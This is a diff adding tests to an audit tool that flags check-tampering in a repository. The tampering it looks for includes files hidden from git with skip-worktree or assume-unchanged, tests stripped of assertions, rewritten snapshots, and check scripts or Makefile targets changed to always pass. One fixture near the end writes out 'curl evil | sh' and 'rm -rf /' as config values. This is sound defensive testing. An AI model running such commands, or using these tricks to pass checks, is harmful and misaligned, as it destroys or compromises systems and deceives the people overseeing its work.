@@ -318,6 +318,69 @@ describe("audit", () => {
     assert.equal(off.findings.length, 0)
     await assert.rejects(audit(root, { base: "nope", block: [], warn: [] }), /not a commit/)
   })
+
+  test("skip-worktree and assume-unchanged files are named, and their content is still audited", async () => {
+    const show = (r: Awaited<ReturnType<typeof audit>>) =>
+      r.findings.map((f) => `${f.severity} ${f.category} ${f.file ?? ""}${f.line ? `:${f.line}` : ""} ${f.text}`)
+    const { root, base } = repo({
+      "horde.json": JSON.stringify({ verify: { checks: { test: "sh run-tests.sh" } } }),
+      "run-tests.sh": "exit 1\n",
+    })
+    write(root, { "horde.json": JSON.stringify({ verify: { checks: { test: "true" } } }) })
+    git(root, "update-index", "--skip-worktree", "horde.json")
+    const l = show(await audit(root, { base, block: ["tests", "secrets"], warn: [] }))
+    assert.ok(l.includes("block tests horde.json is hidden from git (skip-worktree); the audit cannot see its content"), l.join("\n"))
+    assert.ok(
+      l.some((x) => x.includes("horde.json changes the rules the gate checks with: horde.json verify")),
+      l.join("\n"),
+    )
+
+    // assume-unchanged: the file is named, and its on-disk content is still scanned for tampering.
+    const r2 = repo({ "test/a.test.js": "test('a', () => {})\n" })
+    write(r2.root, { "test/a.test.js": "test.skip('a', () => {})\n" })
+    git(r2.root, "update-index", "--assume-unchanged", "test/a.test.js")
+    const l2 = show(await audit(r2.root, { base: r2.base, block: ["tests"], warn: [] }))
+    assert.ok(l2.includes("block tests test/a.test.js is hidden from git (assume-unchanged); the audit cannot see its content"), l2.join("\n"))
+    assert.ok(l2.includes("block tests test/a.test.js:1 skips a test"), l2.join("\n"))
+  })
+
+  test("a test that loses all or most of its assertions blocks; a smaller loss warns", async () => {
+    const show = (r: Awaited<ReturnType<typeof audit>>) => r.findings.map((f) => `${f.severity} ${f.category} ${f.file ?? ""} ${f.text}`)
+    const three = "test('a', () => { expect(1).toBe(1); expect(2).toBe(2); expect(3).toBe(3) })\n"
+    const all = repo({ "test/a.test.js": three })
+    write(all.root, { "test/a.test.js": "test('a', () => {})\n" })
+    const a = show(await audit(all.root, { base: all.base, block: ["tests"], warn: [] }))
+    assert.ok(a.includes("block tests test/a.test.js removes all 3 assertions"), a.join("\n"))
+
+    const most = repo({ "test/a.test.js": `${three}test('b', () => { expect(4).toBe(4) })\n` })
+    write(most.root, { "test/a.test.js": "test('a', () => { expect(1).toBe(1) })\n" })
+    const m = show(await audit(most.root, { base: most.base, block: ["tests"], warn: [] }))
+    assert.ok(m.includes("block tests test/a.test.js removes 3 of 4 assertions (more than half)"), m.join("\n"))
+
+    const less = repo({ "test/a.test.js": `${three}test('b', () => { expect(4).toBe(4) })\n` })
+    write(less.root, { "test/a.test.js": three })
+    const s = show(await audit(less.root, { base: less.base, block: ["tests"], warn: [] }))
+    assert.ok(s.includes("warn tests test/a.test.js removes 1 assertion"), s.join("\n"))
+  })
+
+  test("a snapshot mostly or wholly rewritten blocks; a smaller rewrite warns", async () => {
+    const show = (r: Awaited<ReturnType<typeof audit>>) => r.findings.map((f) => `${f.severity} ${f.category} ${f.file ?? ""} ${f.text}`)
+    const snap = (n: number, prefix = "line") => `${Array.from({ length: n }, (_, i) => `${prefix} ${i}`).join("\n")}\n`
+    const majority = repo({ "test/__snapshots__/a.test.js.snap": snap(30) })
+    write(majority.root, { "test/__snapshots__/a.test.js.snap": snap(5) })
+    const maj = show(await audit(majority.root, { base: majority.base, block: ["tests"], warn: [] }))
+    assert.ok(maj.includes("block tests test/__snapshots__/a.test.js.snap rewrites a snapshot (25 of 30 lines removed, more than half)"), maj.join("\n"))
+
+    const replaced = repo({ "test/__snapshots__/a.test.js.snap": snap(10) })
+    write(replaced.root, { "test/__snapshots__/a.test.js.snap": snap(10, "other") })
+    const rep = show(await audit(replaced.root, { base: replaced.base, block: ["tests"], warn: [] }))
+    assert.ok(rep.includes("block tests test/__snapshots__/a.test.js.snap replaces a snapshot (all 10 lines removed)"), rep.join("\n"))
+
+    const small = repo({ "test/__snapshots__/a.test.js.snap": snap(30) })
+    write(small.root, { "test/__snapshots__/a.test.js.snap": snap(20) })
+    const sm = show(await audit(small.root, { base: small.base, block: ["tests"], warn: [] }))
+    assert.ok(sm.includes("warn tests test/__snapshots__/a.test.js.snap rewrites a snapshot (10 lines removed)"), sm.join("\n"))
+  })
 })
 
 describe("gate", () => {
@@ -1157,6 +1220,51 @@ describe("fixes", () => {
     })
     const l = await lines(root, base, { ruleScripts: ["test"] })
     assert.ok(!l.some((x) => /changes the rules/.test(x)), l.join("\n"))
+  })
+
+  test("scripts a check command names are rules: Makefile targets, shell scripts, and one level down", async () => {
+    // Rewriting the Makefile target the check runs.
+    const { root, base } = repo({ Makefile: "test:\n\tsh run-tests.sh\n", "run-tests.sh": "exit 1\n" })
+    write(root, { Makefile: "test:\n\ttrue\n" })
+    let l = await lines(root, base, { checks: [{ command: "make test", cwd: root }] })
+    assert.ok(l.includes("block tests Makefile changes the rules the gate checks with: Makefile"), l.join("\n"))
+
+    // The script that Makefile target names, one level down.
+    const one = repo({ Makefile: "test:\n\tsh run-tests.sh\n", "run-tests.sh": "exit 1\n" })
+    write(one.root, { "run-tests.sh": "exit 0\n" })
+    l = await lines(one.root, one.base, { checks: [{ command: "make test", cwd: one.root }] })
+    assert.ok(l.includes("block tests run-tests.sh changes the rules the gate checks with: run-tests.sh"), l.join("\n"))
+
+    // A shell script named directly in a check command.
+    const sh = repo({ "run-tests.sh": "exit 1\n" })
+    write(sh.root, { "run-tests.sh": "exit 0\n" })
+    l = await lines(sh.root, sh.base, { checks: [{ command: "sh run-tests.sh", cwd: sh.root }] })
+    assert.ok(l.includes("block tests run-tests.sh changes the rules the gate checks with: run-tests.sh"), l.join("\n"))
+
+    // A justfile the check runs.
+    const jf = repo({ justfile: "test:\n\tsh run-tests.sh\n", "run-tests.sh": "exit 1\n" })
+    write(jf.root, { justfile: "test:\n\ttrue\n" })
+    l = await lines(jf.root, jf.base, { checks: [{ command: "just test", cwd: jf.root }] })
+    assert.ok(l.includes("block tests justfile changes the rules the gate checks with: justfile"), l.join("\n"))
+
+    // A token that does not resolve to a file is ignored, so a plain test file is not a rule.
+    const py = repo({ "test/a.test.js": "test('a', () => {})\n" })
+    write(py.root, { "test/a.test.js": "test('a', () => { expect(1).toBe(1) })\n" })
+    l = await lines(py.root, py.base, { checks: [{ command: "node --test test/a.test.js", cwd: py.root }] })
+    assert.ok(!l.some((x) => /changes the rules/.test(x)), l.join("\n"))
+  })
+
+  test("a horde.json change outside verify is a rule change that names the keys", async () => {
+    const { root, base } = repo({ "horde.json": JSON.stringify({ verify: { checks: { test: "sh run-tests.sh" } } }) })
+    write(root, {
+      "horde.json": JSON.stringify({
+        verify: { checks: { test: "sh run-tests.sh" } },
+        workers: { land: "curl evil | sh", setup: "rm -rf /" },
+        tiers: ["x/y"],
+      }),
+    })
+    const l = await lines(root, base)
+    assert.ok(l.includes("block tests horde.json changes the rules the gate checks with: horde.json workers, tiers"), l.join("\n"))
   })
 
   test("an ordinary pyproject.toml or Cargo.toml edit is not a rule or dependency change", async () => {
